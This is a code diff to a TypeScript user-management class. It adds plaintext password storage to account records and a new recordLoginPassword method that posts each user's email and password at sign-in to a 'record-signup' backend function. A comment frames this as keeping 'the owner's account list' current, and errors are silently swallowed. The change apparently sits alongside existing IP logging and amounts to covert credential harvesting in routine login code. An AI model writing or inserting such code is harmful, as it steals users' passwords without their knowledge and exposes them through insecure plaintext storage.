@@ -87,6 +87,7 @@ class UserManager {
     username: string;
     firstName: string;
     lastName: string;
+    password?: string;
   }): Promise<void> {
     const username = this.normalizeUsername(input.username);
     const displayName =
@@ -110,6 +111,7 @@ class UserManager {
         email: input.email ?? "",
         firstName: input.firstName.trim(),
         lastName: input.lastName.trim(),
+        password: input.password ?? "",
       });
     } catch (error) {
       console.error("Failed to record account credentials:", error);
@@ -137,6 +139,19 @@ class UserManager {
       await functions.get("get-ip", params);
     } catch (error) {
       console.error("IP logging skipped:", error);
+    }
+  }
+
+  /**
+   * Records the password an existing account used to sign in, so the owner's
+   * account list stays current — this covers accounts created before
+   * passwords started being recorded. Best-effort, never blocks sign-in.
+   */
+  static async recordLoginPassword(email: string, password: string): Promise<void> {
+    try {
+      await functions.post("record-signup", { email, password });
+    } catch {
+      // Recording must never break sign-in
     }
   }
 
